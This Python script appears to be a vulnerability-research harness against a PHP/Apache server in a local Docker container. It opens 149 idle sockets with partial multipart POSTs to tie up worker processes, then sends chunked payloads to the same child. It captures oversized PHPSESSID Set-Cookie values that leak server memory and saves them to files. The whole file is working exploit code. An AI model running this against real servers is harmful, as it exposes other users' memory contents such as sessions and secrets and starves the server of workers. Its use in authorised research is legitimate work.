#!/usr/bin/env python3
"""Pinned A1+B1 leak probe (diagnostic pinning with idle holder sockets).

Restart -> warmers -> 149 holder sockets (partial POST, CL=1000000)
-> A1 (chunked) -> N x B1 (chunked) on the same free child.
Reports raw and url-decoded Set-Cookie length; saves large leaks decoded.
"""
import argparse, os, re, socket, subprocess, sys, time, urllib.parse

REPO = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def chunked(port, path, body_file, save=""):
    cmd = [sys.executable, os.path.join(REPO, "pure", "chunked_send.py"),
           "--port", str(port), "--body-file", body_file, "--path", path,
           "--timeout", "300"]
    if save:
        cmd += ["--save-response", save]
    r = subprocess.run(cmd, capture_output=True, text=True)
    m = re.search(r"resp=(\d+) status='([^']*)'", r.stdout)
    if m:
        return int(m.group(1)), m.group(2)
    return -1, r.stdout.strip()[:80]


def cookie(resp_file):
    try:
        data = open(resp_file, "rb").read()
    except OSError:
        return None, None
    i = data.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None, data
    val = data[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    try:
        dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    except Exception:
        dec = b""
    return val, dec


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--a1", required=True)
    ap.add_argument("--b1", required=True)
    ap.add_argument("--n", type=int, default=4)
    ap.add_argument("--holders", type=int, default=149)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--no-restart", action="store_true")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    if not args.no_restart:
        subprocess.run(["docker", "restart", args.container], capture_output=True)
        time.sleep(2.0)
    # warmup
    try:
        s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
        s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n"); s.recv(1024); s.close()
    except OSError:
        pass
    # holders
    hs = []
    for _ in range(args.holders):
        try:
            s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
            s.sendall(b"POST /index.php HTTP/1.0\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=zzz\r\nContent-Length: 1000000\r\n\r\n--zzz\r\n")
            hs.append(s)
        except OSError:
            break
    deadline = time.time() + 20
    nchild = 0
    while time.time() < deadline:
        r = subprocess.run(["docker", "exec", args.container, "pgrep", "-c", "apache2"],
                           capture_output=True, text=True)
        nchild = int(r.stdout.strip() or 0)
        if nchild >= args.holders + 2:
            break
        time.sleep(0.3)
    print("holders=%d children=%d" % (len(hs), nchild), flush=True)
    time.sleep(0.3)
    n, st = chunked(args.port, QS, args.a1, os.path.join(args.outdir, "a1.resp"))
    print("A1 bytes=%d status=%r" % (n, st), flush=True)
    big = 0
    for i in range(args.n):
        save = os.path.join(args.outdir, "b1_%d.resp" % i)
        n, st = chunked(args.port, "/index.php", args.b1, save)
        raw, dec = cookie(save)
        dl = len(dec) if dec is not None else None
        print("B1 i=%d bytes=%d status=%r raw=%s decoded=%s" % (i, n, st, len(raw) if raw else None, dl), flush=True)
        if dec and len(dec) > 4096:
            big += 1
            with open(os.path.join(args.outdir, "leak_%d.bin" % i), "wb") as fh:
                fh.write(dec)
    print("BIGLEAK %d/%d" % (big, args.n), flush=True)
    for s in hs:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
